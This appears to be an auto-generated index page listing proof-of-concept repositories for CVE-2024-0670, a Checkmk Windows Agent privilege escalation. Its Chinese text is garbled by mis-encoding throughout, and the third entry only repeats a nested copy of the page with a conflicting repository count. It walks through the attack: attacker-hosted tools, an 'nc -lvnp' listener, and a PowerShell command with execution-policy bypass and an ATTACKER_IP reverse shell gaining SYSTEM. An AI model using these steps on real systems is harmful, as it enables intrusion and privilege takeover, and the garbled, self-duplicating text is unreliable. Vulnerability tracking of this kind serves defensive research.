# CVE-2024-0670

> ğŸ“¦ è¯¥CVEæœ‰ **3** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md](../2024/CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md)

## CVE-2024-0670 - Checkmk Agent æœ¬åœ°ææƒ

**æ¼æ´ç¼–å·:** CVE-2024-0670

**æ¼æ´ç±»å‹:** æœ¬åœ°æƒé™æå‡

**å½±å“åº”ç”¨:** Checkmk Agent

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœ¬åœ°ç”¨æˆ·å¯è·å– SYSTEM æƒé™

**å½±å“ç‰ˆæœ¬:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**åˆ©ç”¨æ¡ä»¶:** ä½æƒé™çš„Windowsè´¦æˆ·ï¼Œå…è®¸æ‰§è¡Œ Powershellï¼Œèƒ½å¤Ÿä»æ”»å‡»è€…ä¸»æœºä¸‹è½½æ–‡ä»¶ï¼Œå·²å®‰è£…å­˜åœ¨æ¼æ´çš„ Checkmk Windows Agent

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-0670 æ˜¯ Checkmk Agent Windows ç‰ˆæœ¬ä¸­çš„ä¸€ä¸ªæœ¬åœ°æƒé™æå‡æ¼æ´ã€‚æ”»å‡»è€…ï¼ˆæœ¬åœ°ä½æƒé™ç”¨æˆ·ï¼‰å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡ MSI ä¿®å¤æœºåˆ¶æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œè·å¾— SYSTEM æƒé™ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **å‡†å¤‡æ”»å‡»ç¯å¢ƒï¼š**
    *   æ”»å‡»è€…éœ€è¦å‡†å¤‡ä¸€ä¸ª HTTP æœåŠ¡å™¨ï¼Œç”¨äºæ‰˜ç®¡æ”»å‡»æ‰€éœ€çš„å·¥å…·ï¼ˆ`RunasCs.exe`ï¼Œ`nc.exe`ï¼Œ`exploit.ps1`ï¼‰ã€‚
    *   æ”»å‡»è€…éœ€è¦ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”¨äºæ¥æ”¶åå¼¹ shellï¼ˆä¾‹å¦‚ï¼š`nc -lvnp 1111`ï¼‰ã€‚

2.  **åœ¨ç›®æ ‡æœºå™¨ä¸Šä¸‹è½½å·¥å…·ï¼š**
    *   æ”»å‡»è€…ä½¿ç”¨ PowerShell ä»æ”»å‡»è€…æ­å»ºçš„ HTTP æœåŠ¡å™¨ä¸‹è½½ `RunasCs.exe`ï¼Œ`nc.exe`ï¼Œ`exploit.ps1` åˆ° `C:\Windows\Temp\` ç›®å½•ã€‚

3.  **æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬ï¼š**
    *   æ”»å‡»è€…ä½¿ç”¨ PowerShell æ‰§è¡Œ `exploit.ps1` è„šæœ¬ï¼ˆä¾‹å¦‚ï¼š`powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1 -MinPID 1000 -MaxPID 10000 -LHOST ATTACKER_IP -LPORT 1111`ï¼‰ã€‚`exploit.ps1` è„šæœ¬ä¼šæ£€æµ‹ Checkmk MSI åŒ…ï¼Œåˆ›å»ºå¤§é‡çš„æ‰¹å¤„ç†æ–‡ä»¶ï¼Œå¹¶åœ¨æ‰¹å¤„ç†æ–‡ä»¶ä¸­å†™å…¥åå¼¹ shell çš„ Payloadï¼Œç„¶åè§¦å‘ MSI ä¿®å¤ï¼Œè¿«ä½¿ä»¥ SYSTEM æƒé™æ‰§è¡Œæ‰¹å¤„ç†æ–‡ä»¶ï¼Œä»è€Œè·å¾— SYSTEM æƒé™çš„åå¼¹ shellã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´åˆ©ç”¨ä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† Checkmk Agent åœ¨ Windows ä¸Šçš„ä¸€ä¸ªæƒé™æå‡æ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸ä½æƒé™ç”¨æˆ·é€šè¿‡ MSI ä¿®å¤æœºåˆ¶è·å¾— SYSTEM æƒé™ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è¯¥ä»“åº“ä¸­å­˜åœ¨ä¸€å®šæŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯æƒé™æå‡ï¼Œä½†æ˜¯`RunasCs.cs`çš„åŠŸèƒ½æ˜¯ä½¿ç”¨æ˜æ–‡å¯†ç æ¥è¿è¡Œç¨‹åºï¼Œå¦‚æœæ”»å‡»è€…ä¿®æ”¹è¯¥ä»£ç ï¼Œå¯èƒ½ä¼šå¯¼è‡´å¯†ç æ³„éœ²ã€‚æ­¤å¤–ï¼Œæä¾›çš„`exploit.ps1`è„šæœ¬å†…å®¹å¤æ‚ï¼Œå¯èƒ½å­˜åœ¨æœªçŸ¥çš„æ¶æ„è¡Œä¸ºã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º10%ã€‚ç”¨æˆ·åœ¨ä½¿ç”¨å‰éœ€è¦ä»”ç»†å®¡æŸ¥ä»£ç ï¼Œç¡®ä¿å…¶å®‰å…¨æ€§ã€‚

**é¡¹ç›®åœ°å€:** [elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit](https://github.com/elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #2

**æ¥æº**: [CVE-2024-0670-magicrc_CVE-2024-0670.md](../2024/CVE-2024-0670-magicrc_CVE-2024-0670.md)

## CVE-2024-0670-Checkmk-Windows Agentæƒé™æå‡

**æ¼æ´ç¼–å·:** CVE-2024-0670

**æ¼æ´ç±»å‹:** æƒé™æå‡

**å½±å“åº”ç”¨:** Checkmk Windows Agent

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœ¬åœ°æƒé™æå‡è‡³SYSTEM

**å½±å“ç‰ˆæœ¬:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**åˆ©ç”¨æ¡ä»¶:** æœ¬åœ°ç”¨æˆ·æƒé™ï¼Œå¯å†™å…¥C:\Windows\Tempç›®å½•

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-0670 å­˜åœ¨äºCheckmk Windows Agentä¸­ï¼Œæ˜¯ç”±äº Agent åœ¨ C:\Windows\Temp ç›®å½•ä¸‹åˆ›å»ºå’Œæ‰§è¡Œä¸´æ—¶æ–‡ä»¶çš„æ–¹å¼å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡é¢„å…ˆåœ¨ C:\Windows\Temp ç›®å½•ä¸­æ”¾ç½®æ¶æ„æ–‡ä»¶å¹¶å°†å…¶è®¾ç½®ä¸ºåªè¯»ï¼Œå½“ Agent å°è¯•åˆ›å»ºåŒåä¸´æ—¶æ–‡ä»¶æ—¶ï¼Œä¼šå› æ— æ³•è¦†ç›–è€Œæ‰§è¡Œå·²å­˜åœ¨çš„åªè¯»æ¶æ„æ–‡ä»¶ï¼Œä»è€Œä»¥ SYSTEM æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå®ç°æœ¬åœ°æƒé™æå‡ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æŸ¥æ‰¾Check MKå®‰è£…ç¨‹åºï¼š** PoCè„šæœ¬é¦–å…ˆé€šè¿‡æŸ¥è¯¢æ³¨å†Œè¡¨å®šä½Check MKçš„å®‰è£…ç¨‹åºï¼ˆMSIï¼‰ã€‚
2.  **åˆ›å»ºæ¶æ„.cmdæ–‡ä»¶ï¼š**  è„šæœ¬åœ¨ `C:\Windows\Temp` ç›®å½•ä¸‹åˆ›å»ºå¤§é‡ä»¥ `cmk_all_$($i)_$($c).cmd` å‘½åçš„.cmdæ–‡ä»¶ï¼Œå¹¶å°†æŒ‡å®šçš„å‘½ä»¤å†™å…¥è¿™äº›æ–‡ä»¶ï¼Œç„¶åå°†è¿™äº›æ–‡ä»¶è®¾ç½®ä¸ºåªè¯»å±æ€§ã€‚`$Cmd`å˜é‡æ§åˆ¶æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  **è§¦å‘MSIé‡æ–°å®‰è£…ï¼š** PoCè„šæœ¬é€šè¿‡`msiexec.exe /fa`é‡æ–°å®‰è£…Check MKçš„MSIåŒ…ï¼Œè¿™å°†è§¦å‘Check MKå°è¯•åˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼Œç”±äºå·²ç»å­˜åœ¨åŒååªè¯»æ–‡ä»¶ï¼ŒCheck MKå°†ä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆæ”¾ç½®çš„æ¶æ„.cmdæ–‡ä»¶ï¼Œä»è€Œå®ç°æƒé™æå‡ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚ä»README.mdæ–‡ä»¶å†…å®¹ã€PowerShellè„šæœ¬ä»¥åŠç¤ºä¾‹æ‰§è¡Œç»“æœå¯ä»¥çœ‹å‡ºï¼Œè¯¥PoCå·²ç»æˆåŠŸåœ°å®ç°äº†æƒé™æå‡ï¼Œè¯æ˜æ¼æ´çœŸå®å­˜åœ¨ä¸”PoCå¯ç”¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

ç»è¿‡åˆ†æï¼Œè¯¥PoCè„šæœ¬æœ¬èº«ä¸å­˜åœ¨æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥è„šæœ¬çš„è¡Œä¸ºæ˜¯æ˜ç¡®çš„ï¼Œå³åœ¨ C:\Windows\Temp ç›®å½•ä¸‹åˆ›å»ºå¤§é‡åªè¯»çš„ .cmd æ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨ msiexec è§¦å‘ Check MK é‡æ–°å®‰è£…ï¼Œä»è€Œæ‰§è¡Œé¢„å…ˆæ”¾ç½®çš„æ¶æ„ .cmd æ–‡ä»¶ã€‚è„šæœ¬çš„åŠŸèƒ½åœ¨äºåˆ©ç”¨ Check MK çš„æ¼æ´æ¥å®ç°æƒé™æå‡ï¼Œè€Œæ²¡æœ‰å‘ç°ä½œè€…æœ‰æ„éšè—çš„æ¶æ„è¡Œä¸ºã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [magicrc/CVE-2024-0670](https://github.com/magicrc/CVE-2024-0670)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #3

**æ¥æº**: [CVE-2024-0670-zhulin837_checkmk_cve-2024-0670.md](../2024/CVE-2024-0670-zhulin837_checkmk_cve-2024-0670.md)

# CVE-2024-0670

> ğŸ“¦ è¯¥CVEæœ‰ **2** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md](../2024/CVE-2024-0670-elsevar11_CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit.md)

## CVE-2024-0670 - Checkmk Agent æœ¬åœ°ææƒ

**æ¼æ´ç¼–å·:** CVE-2024-0670

**æ¼æ´ç±»å‹:** æœ¬åœ°æƒé™æå‡

**å½±å“åº”ç”¨:** Checkmk Agent

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœ¬åœ°ç”¨æˆ·å¯è·å– SYSTEM æƒé™

**å½±å“ç‰ˆæœ¬:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**åˆ©ç”¨æ¡ä»¶:** ä½æƒé™çš„Windowsè´¦æˆ·ï¼Œå…è®¸æ‰§è¡Œ Powershellï¼Œèƒ½å¤Ÿä»æ”»å‡»è€…ä¸»æœºä¸‹è½½æ–‡ä»¶ï¼Œå·²å®‰è£…å­˜åœ¨æ¼æ´çš„ Checkmk Windows Agent

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-0670 æ˜¯ Checkmk Agent Windows ç‰ˆæœ¬ä¸­çš„ä¸€ä¸ªæœ¬åœ°æƒé™æå‡æ¼æ´ã€‚æ”»å‡»è€…ï¼ˆæœ¬åœ°ä½æƒé™ç”¨æˆ·ï¼‰å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡ MSI ä¿®å¤æœºåˆ¶æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œè·å¾— SYSTEM æƒé™ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **å‡†å¤‡æ”»å‡»ç¯å¢ƒï¼š**
    *   æ”»å‡»è€…éœ€è¦å‡†å¤‡ä¸€ä¸ª HTTP æœåŠ¡å™¨ï¼Œç”¨äºæ‰˜ç®¡æ”»å‡»æ‰€éœ€çš„å·¥å…·ï¼ˆ`RunasCs.exe`ï¼Œ`nc.exe`ï¼Œ`exploit.ps1`ï¼‰ã€‚
    *   æ”»å‡»è€…éœ€è¦ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”¨äºæ¥æ”¶åå¼¹ shellï¼ˆä¾‹å¦‚ï¼š`nc -lvnp 1111`ï¼‰ã€‚

2.  **åœ¨ç›®æ ‡æœºå™¨ä¸Šä¸‹è½½å·¥å…·ï¼š**
    *   æ”»å‡»è€…ä½¿ç”¨ PowerShell ä»æ”»å‡»è€…æ­å»ºçš„ HTTP æœåŠ¡å™¨ä¸‹è½½ `RunasCs.exe`ï¼Œ`nc.exe`ï¼Œ`exploit.ps1` åˆ° `C:\Windows\Temp\` ç›®å½•ã€‚

3.  **æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬ï¼š**
    *   æ”»å‡»è€…ä½¿ç”¨ PowerShell æ‰§è¡Œ `exploit.ps1` è„šæœ¬ï¼ˆä¾‹å¦‚ï¼š`powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1 -MinPID 1000 -MaxPID 10000 -LHOST ATTACKER_IP -LPORT 1111`ï¼‰ã€‚`exploit.ps1` è„šæœ¬ä¼šæ£€æµ‹ Checkmk MSI åŒ…ï¼Œåˆ›å»ºå¤§é‡çš„æ‰¹å¤„ç†æ–‡ä»¶ï¼Œå¹¶åœ¨æ‰¹å¤„ç†æ–‡ä»¶ä¸­å†™å…¥åå¼¹ shell çš„ Payloadï¼Œç„¶åè§¦å‘ MSI ä¿®å¤ï¼Œè¿«ä½¿ä»¥ SYSTEM æƒé™æ‰§è¡Œæ‰¹å¤„ç†æ–‡ä»¶ï¼Œä»è€Œè·å¾— SYSTEM æƒé™çš„åå¼¹ shellã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´åˆ©ç”¨ä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† Checkmk Agent åœ¨ Windows ä¸Šçš„ä¸€ä¸ªæƒé™æå‡æ¼æ´ï¼Œè¯¥æ¼æ´å…è®¸ä½æƒé™ç”¨æˆ·é€šè¿‡ MSI ä¿®å¤æœºåˆ¶è·å¾— SYSTEM æƒé™ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è¯¥ä»“åº“ä¸­å­˜åœ¨ä¸€å®šæŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯æƒé™æå‡ï¼Œä½†æ˜¯`RunasCs.cs`çš„åŠŸèƒ½æ˜¯ä½¿ç”¨æ˜æ–‡å¯†ç æ¥è¿è¡Œç¨‹åºï¼Œå¦‚æœæ”»å‡»è€…ä¿®æ”¹è¯¥ä»£ç ï¼Œå¯èƒ½ä¼šå¯¼è‡´å¯†ç æ³„éœ²ã€‚æ­¤å¤–ï¼Œæä¾›çš„`exploit.ps1`è„šæœ¬å†…å®¹å¤æ‚ï¼Œå¯èƒ½å­˜åœ¨æœªçŸ¥çš„æ¶æ„è¡Œä¸ºã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º10%ã€‚ç”¨æˆ·åœ¨ä½¿ç”¨å‰éœ€è¦ä»”ç»†å®¡æŸ¥ä»£ç ï¼Œç¡®ä¿å…¶å®‰å…¨æ€§ã€‚

**é¡¹ç›®åœ°å€:** [elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit](https://github.com/elsevar11/CVE-2024-0670---CheckMK-Agent-Local-Privilege-Escalation-Exploit)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---

## POC #2

**æ¥æº**: [CVE-2024-0670-magicrc_CVE-2024-0670.md](../2024/CVE-2024-0670-magicrc_CVE-2024-0670.md)

## CVE-2024-0670-Checkmk-Windows Agentæƒé™æå‡

**æ¼æ´ç¼–å·:** CVE-2024-0670

**æ¼æ´ç±»å‹:** æƒé™æå‡

**å½±å“åº”ç”¨:** Checkmk Windows Agent

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœ¬åœ°æƒé™æå‡è‡³SYSTEM

**å½±å“ç‰ˆæœ¬:** < 2.2.0p23, < 2.1.0p40, <= 2.0.0p39

**åˆ©ç”¨æ¡ä»¶:** æœ¬åœ°ç”¨æˆ·æƒé™ï¼Œå¯å†™å…¥C:\Windows\Tempç›®å½•

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-0670 å­˜åœ¨äºCheckmk Windows Agentä¸­ï¼Œæ˜¯ç”±äº Agent åœ¨ C:\Windows\Temp ç›®å½•ä¸‹åˆ›å»ºå’Œæ‰§è¡Œä¸´æ—¶æ–‡ä»¶çš„æ–¹å¼å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡é¢„å…ˆåœ¨ C:\Windows\Temp ç›®å½•ä¸­æ”¾ç½®æ¶æ„æ–‡ä»¶å¹¶å°†å…¶è®¾ç½®ä¸ºåªè¯»ï¼Œå½“ Agent å°è¯•åˆ›å»ºåŒåä¸´æ—¶æ–‡ä»¶æ—¶ï¼Œä¼šå› æ— æ³•è¦†ç›–è€Œæ‰§è¡Œå·²å­˜åœ¨çš„åªè¯»æ¶æ„æ–‡ä»¶ï¼Œä»è€Œä»¥ SYSTEM æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå®ç°æœ¬åœ°æƒé™æå‡ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æŸ¥æ‰¾Check MKå®‰è£…ç¨‹åºï¼š** PoCè„šæœ¬é¦–å…ˆé€šè¿‡æŸ¥è¯¢æ³¨å†Œè¡¨å®šä½Check MKçš„å®‰è£…ç¨‹åºï¼ˆMSIï¼‰ã€‚
2.  **åˆ›å»ºæ¶æ„.cmdæ–‡ä»¶ï¼š**  è„šæœ¬åœ¨ `C:\Windows\Temp` ç›®å½•ä¸‹åˆ›å»ºå¤§é‡ä»¥ `cmk_all_$($i)_$($c).cmd` å‘½åçš„.cmdæ–‡ä»¶ï¼Œå¹¶å°†æŒ‡å®šçš„å‘½ä»¤å†™å…¥è¿™äº›æ–‡ä»¶ï¼Œç„¶åå°†è¿™äº›æ–‡ä»¶è®¾ç½®ä¸ºåªè¯»å±æ€§ã€‚`$Cmd`å˜é‡æ§åˆ¶æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  **è§¦å‘MSIé‡æ–°å®‰è£…ï¼š** PoCè„šæœ¬é€šè¿‡`msiexec.exe /fa`é‡æ–°å®‰è£…Check MKçš„MSIåŒ…ï¼Œè¿™å°†è§¦å‘Check MKå°è¯•åˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼Œç”±äºå·²ç»å­˜åœ¨åŒååªè¯»æ–‡ä»¶ï¼ŒCheck MKå°†ä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆæ”¾ç½®çš„æ¶æ„.cmdæ–‡ä»¶ï¼Œä»è€Œå®ç°æƒé™æå‡ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚ä»README.mdæ–‡ä»¶å†…å®¹ã€PowerShellè„šæœ¬ä»¥åŠç¤ºä¾‹æ‰§è¡Œç»“æœå¯ä»¥çœ‹å‡ºï¼Œè¯¥PoCå·²ç»æˆåŠŸåœ°å®ç°äº†æƒé™æå‡ï¼Œè¯æ˜æ¼æ´çœŸå®å­˜åœ¨ä¸”PoCå¯ç”¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

ç»è¿‡åˆ†æï¼Œè¯¥PoCè„šæœ¬æœ¬èº«ä¸å­˜åœ¨æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥è„šæœ¬çš„è¡Œä¸ºæ˜¯æ˜ç¡®çš„ï¼Œå³åœ¨ C:\Windows\Temp ç›®å½•ä¸‹åˆ›å»ºå¤§é‡åªè¯»çš„ .cmd æ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨ msiexec è§¦å‘ Check MK é‡æ–°å®‰è£…ï¼Œä»è€Œæ‰§è¡Œé¢„å…ˆæ”¾ç½®çš„æ¶æ„ .cmd æ–‡ä»¶ã€‚è„šæœ¬çš„åŠŸèƒ½åœ¨äºåˆ©ç”¨ Check MK çš„æ¼æ´æ¥å®ç°æƒé™æå‡ï¼Œè€Œæ²¡æœ‰å‘ç°ä½œè€…æœ‰æ„éšè—çš„æ¶æ„è¡Œä¸ºã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 0%ã€‚

**é¡¹ç›®åœ°å€:** [magicrc/CVE-2024-0670](https://github.com/magicrc/CVE-2024-0670)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)

---



---

